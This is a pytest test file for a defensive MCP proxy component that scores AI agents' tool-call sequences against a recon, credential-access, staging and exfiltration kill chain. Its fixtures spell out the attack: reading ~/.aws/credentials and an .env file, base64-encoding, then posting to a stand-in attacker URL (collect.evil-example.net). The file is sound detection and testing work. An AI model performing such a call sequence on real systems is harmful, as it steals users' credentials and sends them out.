"""Tests for mcp_proxy.sequence_scoring (kill-chain sequence scoring).

Run: python3 -m pytest mcp_proxy/test_sequence_scoring.py -v
"""

import time

from .sequence_scoring import (
    KillChainScorer,
    SequenceScoringConfig,
    classify_call,
    make_session_key,
    POISON_KILL_CHAIN,
    STAGE_ACCESS,
    STAGE_EXFIL,
    STAGE_RECON,
    STAGE_STAGING,
)
from . import confidence as _confidence

T0 = 1_700_000_000.0  # fixed epoch so decay math is deterministic

EXTERNAL_URL = "https://collect.evil-example.net/drop"
INTERNAL_URL = "http://192.168.1.10:9000/hook"


def _scorer(**cfg):
    return KillChainScorer(SequenceScoringConfig(**cfg))


def _run_chain(scorer, key, t0=T0):
    """The canonical four-stage chain. Returns the four results."""
    r1 = scorer.observe_call(key, "list_files", {"path": "/data"},
                             ts=t0)
    r2 = scorer.observe_call(
        key, "read_file", {"path": "/home/u/.aws/credentials"},
        ts=t0 + 10)
    r3 = scorer.observe_call(key, "base64_encode", {"data": "x"},
                             ts=t0 + 20)
    r4 = scorer.observe_call(
        key, "http_post", {"url": EXTERNAL_URL, "data": "payload"},
        ts=t0 + 30)
    return r1, r2, r3, r4


# -- classification ---------------------------------------------------------

def test_classification_stages():
    stage, _ = classify_call("list_files", {"path": "/data"})
    assert stage == STAGE_RECON
    stage, why = classify_call(
        "read_file", {"path": "/home/u/.aws/credentials"})
    assert stage == STAGE_ACCESS
    assert ".aws" in why or "credentials" in why
    stage, _ = classify_call("base64_encode", {"data": "x"})
    assert stage == STAGE_STAGING
    stage, _ = classify_call(
        "http_post", {"url": EXTERNAL_URL, "data": "payload"})
    assert stage == STAGE_EXFIL


def test_classification_benign_calls_have_no_stage():
    assert classify_call("read_file", {"path": "README.md"})[0] is None
    assert classify_call("get_weather", {"city": "Boston"})[0] is None
    assert classify_call("run_tests", {})[0] is None
    # Outbound call to an internal endpoint is not exfiltration.
    assert classify_call(
        "http_post", {"url": INTERNAL_URL, "data": "x"})[0] is None
    # A read of an ordinary file is not sensitive access.
    assert classify_call(
        "read_file", {"path": "src/main.py"})[0] is None


# -- progression and verdicts ----------------------------------------------

def test_full_chain_escalates_to_block():
    s = _scorer()
    key = make_session_key("agent-1", "http://up:8000")
    r1, r2, r3, r4 = _run_chain(s, key)
    # recon alone: 15 points, below the flag threshold.
    assert r1["verdict"] == "allow"
    assert r1["risk_score"] == 15.0
    # access completes stage 2: ~45 points, flags.
    assert r2["verdict"] == "flag"
    assert r2["poison_category"] == POISON_KILL_CHAIN
    assert r2["sequence"]["stage"] == STAGE_ACCESS
    # staging: ~65 points, still flagging.
    assert r3["verdict"] == "flag"
    assert r3["sequence"]["stage"] == STAGE_STAGING
    # exfiltration completes the chain: ~95 points, blocks.
    assert r4["verdict"] == "block"
    assert r4["poison_category"] == POISON_KILL_CHAIN
    assert r4["sequence"]["stages_seen"] == [
        STAGE_RECON, STAGE_ACCESS, STAGE_STAGING, STAGE_EXFIL]
    # Explanation is audit-shaped: stages, tools, thresholds.
    expl = r4["sequence"]["explanation"]
    assert "list_files" in expl and "http_post" in expl
    assert "flag at 40" in expl and "block at 85" in expl
    # Confidence shape: the KILL_CHAIN signal scores against the
    # confidence module under its own dedicated cause code
    # (risk-scaled: a completed chain at ~94 yields 92, above the
    # old flat ATTACK_CHAIN 88 it replaces).
    scored = _confidence.score_verdict("BLOCK", r4["signals"])
    assert scored["cause_codes"][0]["code"] == "KILL_CHAIN"
    assert scored["confidence"] == 92
    # After a block, progression resets but the session stays hot.
    state = s.session_state(key, ts=T0 + 31)
    assert state["stage"] is None
    assert state["score"] > 85.0
    assert state["chain"] == 2


def test_partial_chain_flags_only():
    s = _scorer()
    key = make_session_key("agent-1")
    r1 = s.observe_call(key, "search_docs", {"q": "x"}, ts=T0)
    r2 = s.observe_call(key, "read_file",
                        {"path": "/etc/app/.env"}, ts=T0 + 5)
    assert r1["verdict"] == "allow"
    assert r2["verdict"] == "flag"
    assert r2["risk_score"] >= 40.0
    # The chain stalls: later benign calls do not keep flagging.
    r3 = s.observe_call(key, "get_weather", {"city": "Boston"},
                        ts=T0 + 15)
    assert r3["verdict"] == "allow"
    assert r3["poison_category"] == "clean"


def test_benign_sequences_never_escalate():
    s = _scorer()
    key = make_session_key("agent-1")
    workflow = [
        ("search_docs", {"q": "quarterly report"}),
        ("read_file", {"path": "README.md"}),
        ("run_tests", {}),
        ("get_weather", {"city": "Boston"}),
        ("fetch_status", {"url": "http://internal:9000/health"}),
        ("search_docs", {"q": "second query"}),
        ("read_file", {"path": "docs/guide.md"}),
    ]
    ts = T0
    for round_ in range(3):
        for tool, args in workflow:
            result = s.observe_call(key, tool, args, ts=ts)
            assert result["verdict"] == "allow", (tool, result)
            ts += 60
    state = s.session_state(key, ts=ts)
    # Only the single recon stage ever counted, and it decays.
    assert state["score"] <= 15.0
    assert state["stages_seen"] in ([], [STAGE_RECON])


def test_repeated_stage_does_not_double_count():
    s = _scorer()
    key = make_session_key("agent-1")
    for i, tool in enumerate(
            ["list_files", "search_docs", "scan_ports", "find_users",
             "list_directory"]):
        result = s.observe_call(key, tool, {}, ts=T0 + i)
    # Five recon-shaped calls: recon counted exactly once.
    assert result["risk_score"] == 15.0
    assert result["verdict"] == "allow"


def test_gap_observations_score_partial_only():
    s = _scorer()
    key = make_session_key("agent-1")
    # Exfiltration-shaped call with no prior chain: gap credit only.
    r = s.observe_call(key, "http_post",
                       {"url": EXTERNAL_URL, "data": "x"}, ts=T0)
    assert r["verdict"] == "allow"
    assert r["risk_score"] == 20.0
    assert r["sequence"]["stage"] is None
    # Recon, then a jump straight to exfiltration: 15 + gap 20 = 35,
    # still below the flag threshold.
    key2 = make_session_key("agent-2")
    s.observe_call(key2, "list_files", {}, ts=T0)
    r = s.observe_call(key2, "http_post",
                       {"url": EXTERNAL_URL, "data": "x"}, ts=T0 + 5)
    assert r["verdict"] == "allow"
    assert 30.0 < r["risk_score"] < 40.0


def test_interleaved_sessions_do_not_contaminate():
    s = _scorer()
    a = make_session_key("agent-1", "http://up:8000")
    b = make_session_key("agent-2", "http://up:8000")
    a_calls = [
        ("list_files", {"path": "/data"}),
        ("read_file", {"path": "/home/u/.aws/credentials"}),
        ("base64_encode", {"data": "x"}),
        ("http_post", {"url": EXTERNAL_URL, "data": "p"}),
    ]
    b_calls = [
        ("search_docs", {"q": "notes"}),
        ("read_file", {"path": "README.md"}),
        ("get_weather", {"city": "Boston"}),
        ("run_tests", {}),
    ]
    ts = T0
    last_a = last_b = None
    for (ta, aa), (tb, ab) in zip(a_calls, b_calls):
        last_a = s.observe_call(a, ta, aa, ts=ts)
        last_b = s.observe_call(b, tb, ab, ts=ts + 1)
        ts += 10
    assert last_a["verdict"] == "block"
    assert last_b["verdict"] == "allow"
    assert s.session_state(b, ts=ts)["score"] <= 15.0
    # Same agent, different server: a different session entirely.
    c = make_session_key("agent-1", "http://other:9000")
    assert s.session_state(c, ts=ts)["known"] is False


# -- decay, window, reset ----------------------------------------------------

def test_decay_resets_progression():
    s = _scorer()
    key = make_session_key("agent-1")
    s.observe_call(key, "list_files", {}, ts=T0)
    r = s.observe_call(key, "read_file",
                       {"path": "/home/u/.aws/credentials"}, ts=T0 + 10)
    assert r["verdict"] == "flag"
    # Four half-lives of quiet (default half-life 900s): the score
    # decays below the reset floor and progression is forgotten.
    later = T0 + 10 + 4 * 900
    r = s.observe_call(key, "get_weather", {"city": "Boston"},
                        ts=later)
    assert r["risk_score"] < 5.0
    assert r["sequence"]["stage"] is None
    assert r["sequence"]["stages_seen"] == []
    # A lone exfiltration-shaped call now is a fresh gap observation
    # (20 points), not the completion of the old chain.
    r = s.observe_call(key, "http_post",
                       {"url": EXTERNAL_URL, "data": "x"}, ts=later + 5)
    assert r["verdict"] == "allow"
    assert r["risk_score"] < 30.0
    assert r["sequence"]["stage"] is None


def test_window_expiry_abandons_progression():
    s = _scorer(window_s=60.0)
    key = make_session_key("agent-1")
    s.observe_call(key, "list_files", {}, ts=T0)
    # Access arrives after the progression window closed: it scores
    # as a gap observation, not a stage advance.
    r = s.observe_call(key, "read_file",
                       {"path": "/home/u/.aws/credentials"}, ts=T0 + 120)
    assert r["verdict"] == "allow"
    assert r["sequence"]["stage"] is None
    assert r["risk_score"] < 40.0
    # Inside the window, the same pair advances and flags.
    key2 = make_session_key("agent-2")
    s.observe_call(key2, "list_files", {}, ts=T0)
    r = s.observe_call(key2, "read_file",
                       {"path": "/home/u/.aws/credentials"}, ts=T0 + 30)
    assert r["verdict"] == "flag"
    assert r["sequence"]["stage"] == STAGE_ACCESS


# -- result-side observation -------------------------------------------------

def test_result_endpoints_complete_chain():
    s = _scorer()
    key = make_session_key("agent-1")
    s.observe_call(key, "list_files", {}, ts=T0)
    s.observe_call(key, "read_file",
                   {"path": "/home/u/.aws/credentials"}, ts=T0 + 10)
    r = s.observe_call(key, "base64_encode", {"data": "x"}, ts=T0 + 20)
    assert r["verdict"] == "flag"
    # A result steering the session to an external endpoint is the
    # exfiltration stage: the chain completes and blocks.
    r = s.observe_result(key, ["collect.evil-example.net"],
                         tool_name="read_file", ts=T0 + 25)
    assert r["verdict"] == "block"
    assert r["sequence"]["stages_seen"][-1] == STAGE_EXFIL


def test_result_endpoints_alone_are_gap_only():
    s = _scorer()
    key = make_session_key("agent-1")
    r = s.observe_result(key, ["collect.evil-example.net"], ts=T0)
    assert r["verdict"] == "allow"
    assert r["risk_score"] == 20.0
    # Internal endpoints in results are not exfiltration evidence.
    r = s.observe_result(key, ["192.168.1.10", "localhost"], ts=T0 + 5)
    assert r["verdict"] == "allow"
    assert r["risk_score"] <= 20.0  # unchanged apart from decay


# -- configuration -----------------------------------------------------------

def test_block_stage_blocks_regardless_of_score():
    low_points = {"recon": 5.0, "access": 5.0, "staging": 5.0,
                  "exfil": 5.0}
    s = _scorer(stage_points=low_points)
    key = make_session_key("agent-1")
    _, _, _, r4 = _run_chain(s, key)
    # Full chain scores only ~20, far under the block threshold of
    # 85, but completing the exfil stage in order blocks.
    assert r4["risk_score"] < 85.0
    assert r4["verdict"] == "block"
    # With the block-stage rule off, the same chain does not block.
    s2 = _scorer(stage_points=low_points, block_stage=None)
    _, _, _, r4 = _run_chain(s2, make_session_key("agent-1"))
    assert r4["verdict"] == "allow"


def test_disabled_scorer_allows_everything():
    s = _scorer(enabled=False)
    key = make_session_key("agent-1")
    _, _, _, r4 = _run_chain(s, key)
    assert r4["verdict"] == "allow"
    assert r4["risk_score"] == 0.0
    assert s.session_state(key)["known"] is False


def test_config_from_dict_and_env():
    cfg = SequenceScoringConfig.from_dict(
        {"enabled": False, "flag_threshold": 55,
         "stage_points": {"access": 50}})
    assert cfg.enabled is False
    assert cfg.flag_threshold == 55.0
    assert cfg.stage_points[STAGE_ACCESS] == 50.0
    assert cfg.stage_points[STAGE_RECON] == 15.0  # default kept

    cfg = SequenceScoringConfig.from_env(
        {"MCP_PROXY_KILL_CHAIN": "false",
         "MCP_PROXY_KILL_CHAIN_FLAG_SCORE": "25",
         "MCP_PROXY_KILL_CHAIN_BLOCK_STAGE": "never"})
    assert cfg.enabled is False
    assert cfg.flag_threshold == 25.0
    assert cfg.block_stage is None


def test_session_cap_evicts_oldest():
    s = _scorer(max_sessions=16)
    for i in range(20):
        s.observe_call(make_session_key(f"agent-{i}"),
                       "get_weather", {"city": "Boston"}, ts=T0 + i)
    assert len(s.sessions()) == 16
    # The oldest sessions were evicted; the newest is still tracked.
    assert s.session_state(make_session_key("agent-19"),
                           ts=T0 + 20)["known"] is True
    assert s.session_state(make_session_key("agent-0"),
                           ts=T0 + 20)["known"] is False
